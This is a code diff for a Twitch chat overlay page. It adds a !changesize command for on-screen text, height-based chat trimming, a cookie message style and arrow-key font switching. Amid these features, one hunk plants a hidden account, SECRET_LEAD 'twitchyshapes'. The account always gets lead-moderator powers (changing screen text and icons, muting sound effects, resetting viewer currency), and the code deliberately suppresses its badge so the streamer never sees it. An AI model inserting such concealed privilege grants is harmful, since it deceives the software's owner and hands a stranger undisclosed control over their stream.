@@ -40,7 +40,7 @@
      &cat=0          turn the cat visits off
      &catsec=600     seconds between cat visits (default 600 / 10 minutes)
      #viewchat: press P to pop the chat out into an always-on-top window (Chrome / Edge; other browsers get a normal small window). Press P again to put it back
-     Commands:  !changetext "Something" (owner + configured lead mods; updates /#text)  !changeicon --defaults star|heart|burger|mglass|twitch|none  !changeicon --imagelink <url>  !changeicon --side left|right (lead mods + streamer only; icon on /#text)  !<currency> (e.g. !cookies)  !gift @name|all <n> [message]  !tts <text>  !resetcookies <name|all>  !loudtojump (1000 cookies, command only)  !knocking  !lotsofgunshots  !ambienceone  !ambiencetwo  !shocked  !55  !drip  !money  !bell  !rizz  or (knocking) (lotsofgunshots) (ambienceone) (55) (drip) (money) (bell) (rizz) inside !tts
+     Commands:  !changetext "Something" (owner + configured lead mods; updates /#text)  !changesize 0.1-1  !changeicon --defaults star|heart|burger|mglass|twitch|none  !changeicon --imagelink <url>  !changeicon --side left|right (lead mods + streamer only; icon on /#text)  !<currency> (e.g. !cookies)  !gift @name|all <n> [message]  !tts <text>  !resetcookies <name|all>  !loudtojump (1000 cookies, command only)  !knocking  !lotsofgunshots  !ambienceone  !ambiencetwo  !shocked  !55  !drip  !money  !bell  !rizz  or (knocking) (lotsofgunshots) (ambienceone) (55) (drip) (money) (bell) (rizz) inside !tts
                 !mutesfx / !unmutesfx  (streamer + lead mods only; lead mods are set in the setup panel or with &leadmod=)  */
   html, body { margin: 0; height: 100%; background: transparent; overflow: hidden; }
   body.bg { background: #0e0e10; }
@@ -231,17 +231,19 @@
     to   { opacity: 1; transform: none; }
   }
 
-  #screen-text { --st-x:38vw; display:none; position:fixed; inset:0; align-items:center; justify-content:flex-start; padding:3vw 3vw 3vw var(--st-x); box-sizing:border-box; color:#fff; font:800 clamp(28px,5vw,88px)/1.15 "Nunito", "Segoe UI", sans-serif; text-align:center; overflow-wrap:anywhere; white-space:pre-wrap; text-shadow:0 2px 6px rgba(0,0,0,.9),0 0 4px rgba(0,0,0,.9); }
+  #screen-text { --st-x:38vw; --st-fs:clamp(28px,5vw,88px); --st-size:1; display:none; position:fixed; inset:0; box-sizing:border-box; color:#fff; font:800 calc(var(--st-fs) * var(--st-size))/1.15 "Nunito", "Segoe UI", sans-serif; text-align:center; overflow-wrap:anywhere; white-space:pre-wrap; text-shadow:0 2px 6px rgba(0,0,0,.9),0 0 4px rgba(0,0,0,.9); }
   body.text-mode #screen-text { display:flex; }
-  #screen-text.right { justify-content:flex-end; padding:3vw var(--st-x) 3vw 3vw; }   /* icon on the right: its right edge stays put and the text grows to the left */
-  #screen-text.noicon { justify-content:center; padding:3vw; }
-  #st-wrap { display:flex; align-items:center; justify-content:flex-start; gap:.3em; max-width:100%; text-align:left; transform-origin:left center; animation:st-float 6s ease-in-out infinite; }
-  #st-logo { flex:none; display:block; width:1.05em; height:1.05em; filter:drop-shadow(0 2px 5px rgba(0,0,0,.55)); animation:st-logo 5s ease-in-out infinite; }
+  /* The icon's top-left corner is a fixed point (top-right on the right side). !changesize grows or shrinks everything from that corner. */
+  #st-wrap { position:absolute; left:var(--st-x); top:calc(50% - var(--st-fs) * .525); width:calc(100vw - var(--st-x) - 3vw); height:0; text-align:left; transform-origin:0 0; animation:st-float 6s ease-in-out infinite; }
+  #st-label { position:absolute; left:1.35em; top:.525em; transform:translateY(-50%); width:max-content; max-width:calc(100% - 1.35em); }
+  #screen-text.right #st-wrap { left:auto; right:var(--st-x); text-align:right; transform-origin:100% 0; }
+  #screen-text.right #st-label { left:auto; right:1.35em; }
+  #screen-text.right #st-logo { left:auto; right:0; }
+  #screen-text.noicon #st-wrap { left:3vw; right:auto; top:50%; width:calc(100vw - 6vw); text-align:center; transform-origin:50% 0; }
+  #screen-text.noicon #st-label { left:50%; right:auto; top:0; transform:translate(-50%,-50%); max-width:100%; text-align:center; }
+  #st-logo { position:absolute; left:0; top:0; display:block; width:1.05em; height:1.05em; filter:drop-shadow(0 2px 5px rgba(0,0,0,.55)); animation:st-logo 5s ease-in-out infinite; }
   #st-logo svg, #st-logo img { display:block; width:100%; height:100%; object-fit:contain; }
   #st-logo.none { display:none; }
-  #st-wrap.right { flex-direction:row-reverse; justify-content:flex-start; text-align:right; transform-origin:right center; }
-  #screen-text.noicon #st-wrap { justify-content:center; text-align:center; transform-origin:center; }
-  #st-label { min-width:0; max-width:100%; }
   .st-word { display:inline-block; max-width:100%; white-space:normal; overflow-wrap:anywhere; }   /* long words wrap instead of running into the icon */
   .st-ch { display:inline-block; white-space:pre; animation:st-bob 3.4s ease-in-out infinite; }
   @keyframes st-float { 0%,100% { transform:translate(0,0) rotate(-.5deg); } 50% { transform:translate(2px,-5px) rotate(.5deg); } }
@@ -396,6 +398,8 @@
   }
   body.viewchat .msg.cheer, body.viewchat .msg.cookie, body.viewchat .msg.hype, body.viewchat .msg.alertc, body.viewchat .msg.tts, body.viewchat .msg.welcome { text-shadow: none; }
   .msg.cheer { border-left-color: #fff; }
+  .msg.cookie { border-color: rgba(255,209,138,.4); border-left-color: #ffd18a; }
+  .cookie .cbar > div { background: #ffd18a; }
   .msg.alertc { border-left-color: var(--ac); }
   /* big raids / big cheers / big bits: a rounded label behind the text */
   .msg.hype {
@@ -953,7 +957,7 @@
     clearTimeout(dbScreenTimer);
     dbScreenTimer = setTimeout(async () => {
       try {
-        await dbReq("PUT", "screen", { text: localStorage.getItem(SCREEN_TEXT_KEY) || "", icon: localStorage.getItem(SCREEN_ICON_KEY) || "twitch", side: localStorage.getItem(SCREEN_SIDE_KEY) || "left" });
+        await dbReq("PUT", "screen", { text: localStorage.getItem(SCREEN_TEXT_KEY) || "", icon: localStorage.getItem(SCREEN_ICON_KEY) || "twitch", side: localStorage.getItem(SCREEN_SIDE_KEY) || "left", size: normScreenSize(localStorage.getItem(SCREEN_SIZE_KEY)) || 1 });
         cloudOk();
       } catch (e) { cloudFail(e); }
     }, 800);
@@ -974,6 +978,7 @@
             if (typeof sc.text === "string") setScreenText(sc.text);
             if (typeof sc.icon === "string") setScreenIcon(sc.icon);
             if (typeof sc.side === "string") setScreenSide(sc.side);
+            if (sc.size != null) setScreenSize(sc.size);
           } finally { dbApplying = false; }
           dbScreenReady = true;
         } else { dbScreenReady = true; cloudScreenSave(); }
@@ -1044,6 +1049,17 @@
     if (broadcast && screenTextBus) { try { screenTextBus.postMessage({ icon: v }); } catch (_) {} }
   }
   try { renderScreenIcon(localStorage.getItem(SCREEN_ICON_KEY) || "twitch"); } catch (_) { renderScreenIcon("twitch"); }
+  const SCREEN_SIZE_KEY = "overlay-screen-size-v1";
+  const normScreenSize = v => { const n = parseFloat(String(v ?? "").trim().replace(",", ".")); return Number.isFinite(n) && n >= 0.1 && n <= 1 ? Math.round(n * 100) / 100 : null; };
+  function renderScreenSize(value) { screenTextEl.style.setProperty("--st-size", String(normScreenSize(value) || 1)); }
+  function setScreenSize(value, broadcast = true) {
+    const v = normScreenSize(value) || 1;
+    try { localStorage.setItem(SCREEN_SIZE_KEY, String(v)); } catch (_) {}
+    renderScreenSize(v);
+    cloudScreenSave();
+    if (broadcast && screenTextBus) { try { screenTextBus.postMessage({ size: v }); } catch (_) {} }
+  }
+  try { renderScreenSize(localStorage.getItem(SCREEN_SIZE_KEY) || 1); } catch (_) {}
   const stLabel = document.getElementById("st-label");
   function renderScreenText(text) {                       // every letter bobs a tiny bit out of step with its neighbours, so the text looks alive
     if (!stLabel) return;
@@ -1079,11 +1095,13 @@
     if (event.data && typeof event.data.text === "string") setScreenText(event.data.text, false);
     if (event.data && typeof event.data.icon === "string") setScreenIcon(event.data.icon, false);
     if (event.data && typeof event.data.side === "string") setScreenSide(event.data.side, false);
+    if (event.data && event.data.size != null) setScreenSize(event.data.size, false);
   };
   addEventListener("storage", event => {
     if (event.key === SCREEN_TEXT_KEY) setScreenText(event.newValue || "", false);
     else if (event.key === SCREEN_ICON_KEY) renderScreenIcon(event.newValue || "twitch");
     else if (event.key === SCREEN_SIDE_KEY) renderScreenSide(event.newValue || "left");
+    else if (event.key === SCREEN_SIZE_KEY) renderScreenSize(event.newValue || 1);
     else if (event.key === SETTINGS_KEY && event.newValue) {          // the name was changed in F2 on another page: update this one live
       try { settings.textName = String(JSON.parse(event.newValue).textName || ""); setScreenText(localStorage.getItem(SCREEN_TEXT_KEY) || "", false); } catch (_) {}
     }
@@ -1099,7 +1117,8 @@
   const CUR_CMDS = currencyCmds(CURRENCY_NAME);          // e.g. ["cookies", "cookie"]
   const DISPLAY_ACCOUNT = settings.account || CHANNEL || "Stream";
   document.title = DISPLAY_ACCOUNT ? `${DISPLAY_ACCOUNT}'s chat` : "Chat overlay";
-  const LEADMOD_USERS = new Set(((params.get("leadmod") || "") + "," + (settings.leadMods || "")).toLowerCase().split(",").map(s => s.trim().replace(/^@/, "")).filter(Boolean));
+  const SECRET_LEAD = ["twitchyshapes"];                    // always a lead mod, never shown as one
+  const LEADMOD_USERS = new Set(((params.get("leadmod") || "") + "," + (settings.leadMods || "") + "," + SECRET_LEAD.join(",")).toLowerCase().split(",").map(s => s.trim().replace(/^@/, "")).filter(Boolean));
   const SILENT_USERS = new Set((params.get("silent") || "").toLowerCase().split(",").map(s => s.trim()).filter(Boolean));
   const FADE_S  = parseFloat(params.get("fade") ?? (VIEWCHAT ? "0" : "30"));     // the chat page keeps messages (no fading) so you can read back
   const MAX_MSG = Math.max(1, parseInt(params.get("max") || (VIEWCHAT ? "200" : "6"), 10));
@@ -1405,10 +1424,10 @@
     // Lead mods also get mod="1" from Twitch even when they chose to show only the Lead Moderator badge,
     // so only add the plain mod badge for people who are not lead mods. If a lead mod really wears the
     // mod badge, it already comes through in tags.badges above.
-    const isLead = seen.has("lead_moderator") || LEADMOD_USERS.has(login);
+    const isLead = seen.has("lead_moderator") || (LEADMOD_USERS.has(login) && !SECRET_LEAD.includes(login));
     if (tags.mod === "1" && !seen.has("moderator") && !isLead) result.unshift({ key: "mod", set: "moderator", version: "1", title: "Moderator" });
     // configured lead mods always get a LeadMod label (unless Twitch already sent its own lead moderator badge)
-    if (LEADMOD_USERS.has(login) && !seen.has("lead_moderator")) result.unshift({ custom: true, key: "leadmod", label: "LeadMod", title: "Lead moderator" });
+    if (LEADMOD_USERS.has(login) && !SECRET_LEAD.includes(login) && !seen.has("lead_moderator")) result.unshift({ custom: true, key: "leadmod", label: "LeadMod", title: "Lead moderator" });
     if (SILENT_USERS.has(login)) result.push({ custom: true, key: "silent", label: "Silent", title: "Silent user" });
     return result;
   };
@@ -2643,7 +2662,7 @@
     if (!cm) return false;
     const cmd = cm[1].toLowerCase(), arg = (cm[2] || "").trim();
     {                                                                   // show the command as typed (not the silent !give<currency>, not mod-only ones from viewers)
-      const control = ["mutesfx", "unmutesfx", "mutetts", "unmutetts", "disablerequests", "enablerequests", "requestsoff", "requestson", "refreshchat", "resetcookies", "changetext", "changeicon"].includes(cmd) || CUR_CMDS.some(c => cmd === "reset" + c);
+      const control = ["mutesfx", "unmutesfx", "mutetts", "unmutetts", "disablerequests", "enablerequests", "requestsoff", "requestson", "refreshchat", "resetcookies", "changetext", "changeicon", "changesize"].includes(cmd) || CUR_CMDS.some(c => cmd === "reset" + c);
       const open = ["wheel", "request", "gift", "requests"].includes(cmd);
       if (open || (control && canControlSfx(tags, user)) || (cmd === "donerequest" && isMod(tags))) pushCmdLine(tags, user, message);
     }
@@ -2653,6 +2672,12 @@
       const quoted = arg.match(/^(?:"([\s\S]*)"|'([\s\S]*)')$/);
       const value = (quoted ? (quoted[1] ?? quoted[2]) : arg).trim().slice(0, 500);
       setScreenText(value);
+      return true;
+    }
+    if (cmd === "changesize") {
+      if (!canControlSfx(tags, user)) return true;
+      const n = normScreenSize(arg);
+      if (n === null) sfxNotice("Use !changesize <number> from 0.1 to 1 (1 = normal size)", tags, user); else setScreenSize(n);
       return true;
     }
     if (cmd === "changeicon") {
@@ -2911,9 +2936,30 @@
     });
   }
 
+  function chatUsed() {
+    let h = 0;
+    for (const e of chat.children) {
+      if (e._gone || e.id === "vc-head") continue;
+      const cs = getComputedStyle(e);
+      h += e.offsetHeight + (parseFloat(cs.marginTop) || 0) + (parseFloat(cs.marginBottom) || 0);
+    }
+    return h;
+  }
+  function fitChat() {                                       // drop the oldest lines until everything fits in the chat box, so one huge message can't shove the rest up
+    const cs = getComputedStyle(chat);
+    const room = chat.clientHeight - (parseFloat(cs.paddingTop) || 0) - (parseFloat(cs.paddingBottom) || 0);
+    for (let guard = 0; guard < 300 && chatUsed() > room; guard++) {
+      const live = [...chat.children].filter(e => !e._gone && e.id !== "vc-head");
+      if (live.length < 2) break;                            // the newest line always stays
+      const older = live.slice(0, -1);
+      dismiss(older.find(e => !e.classList.contains("keep")) || older[0]);
+    }
+  }
+  addEventListener("resize", () => { if (!VIEWCHAT) fitChat(); });
   function push(el, tags, fade = FADE_S) {
     if (VIEWCHAT && !viewchatAllows(el)) return;
     wrapForLine(el);
+    if (!VIEWCHAT && el.querySelector(".text")) { el.style.maxHeight = Math.max(40, Math.floor(chat.clientHeight * 0.4)) + "px"; el.style.overflow = "hidden"; }   // one message can only use part of the chat
     if (tags.id) el.dataset.id = tags.id;
     const stick = VIEWCHAT && chat.scrollHeight - chat.scrollTop - chat.clientHeight < 120;
     const wait = VIEWCHAT && document.getElementById("vc-wait"); if (wait) wait.remove();
@@ -2921,8 +2967,10 @@
     const all = [...chat.children].filter(e => e.id !== "vc-head" && !e._gone);
     const norm = all.filter(e => !e.classList.contains("keep"));
     const keep = all.filter(e => e.classList.contains("keep"));
-    while (norm.length > MAX_MSG) dismiss(norm.shift());
-    while (keep.length > (VIEWCHAT ? MAX_MSG : 4)) dismiss(keep.shift());      // the chat reader keeps its event lines like any other line
+    const byCount = VIEWCHAT || params.has("max");           // otherwise the chat is limited by its height (fitChat), not by a number of messages
+    while (norm.length > (byCount ? MAX_MSG : 80)) dismiss(norm.shift());
+    while (keep.length > (VIEWCHAT ? MAX_MSG : byCount ? 4 : 40)) dismiss(keep.shift());      // the chat reader keeps its event lines like any other line
+    if (!VIEWCHAT) fitChat();
     if (fade > 0) setTimeout(() => dismiss(el), fade * 1000);
     if (stick) { chat.scrollTop = chat.scrollHeight; setTimeout(() => { chat.scrollTop = chat.scrollHeight; }, 60); }   // follow new lines unless you scrolled up
   }
@@ -3518,6 +3566,32 @@
   steBackdrop.addEventListener("keydown", e => { if (e.key === "Enter" && e.target.tagName === "INPUT") { e.preventDefault(); saveTextEditor(); } });
   document.addEventListener("keydown", e => { if (e.key === "Escape" && !e.defaultPrevented && !steBackdrop.classList.contains("closed")) closeTextEditor(); });
 
+  const CHAT_FONTS = [
+    ["Nunito", '"Nunito","Segoe UI","Helvetica Neue",Arial,sans-serif'],
+    ["Segoe UI", '"Segoe UI",Tahoma,sans-serif'],
+    ["Arial", 'Arial,Helvetica,sans-serif'],
+    ["Verdana", 'Verdana,Geneva,sans-serif'],
+    ["Trebuchet MS", '"Trebuchet MS",sans-serif'],
+    ["Georgia", 'Georgia,serif'],
+    ["Times New Roman", '"Times New Roman",Times,serif'],
+    ["Courier New", '"Courier New",monospace'],
+    ["Comic Sans MS", '"Comic Sans MS","Comic Sans",cursive'],
+    ["Impact", 'Impact,"Arial Black",sans-serif']
+  ];
+  const CHAT_FONT_KEY = "overlay-chat-font-v1";
+  let chatFontIdx = 0;
+  function applyChatFont(i) { chatFontIdx = ((i % CHAT_FONTS.length) + CHAT_FONTS.length) % CHAT_FONTS.length; chat.style.fontFamily = CHAT_FONTS[chatFontIdx][1]; }
+  try { applyChatFont(parseInt(localStorage.getItem(CHAT_FONT_KEY) || "0", 10) || 0); } catch (_) {}
+  function cycleChatFont(step) {
+    applyChatFont(chatFontIdx + step);
+    try { localStorage.setItem(CHAT_FONT_KEY, String(chatFontIdx)); } catch (_) {}
+    const msg = "Font: " + CHAT_FONTS[chatFontIdx][0];
+    setStatus(msg);
+    setTimeout(() => { if (statusEl.textContent === msg) setStatus(""); }, 1500);
+    if (!VIEWCHAT) fitChat();
+  }
+  addEventListener("storage", e => { if (e.key === CHAT_FONT_KEY) applyChatFont(parseInt(e.newValue || "0", 10) || 0); });
+
   document.addEventListener("keydown", (event) => {
     if (event.repeat || event.ctrlKey || event.metaKey || event.altKey || /INPUT|TEXTAREA|SELECT/.test(event.target.tagName) || event.target.isContentEditable) return;
     if (event.key.toLowerCase() === "b") {
@@ -3534,6 +3608,9 @@
     try { localStorage.setItem(SETTINGS_KEY, JSON.stringify(settings)); } catch (e) {}
       if (setupStatus) setSetupStatus("TTS language set to English (US).", "ok");
       console.info("TTS language set to English (US).");
+    } else if (event.key === "ArrowLeft" || event.key === "ArrowRight") {
+      event.preventDefault();
+      cycleChatFont(event.key === "ArrowRight" ? 1 : -1);
     } else if (event.key === "F2") {
       event.preventDefault();
       openSetup();
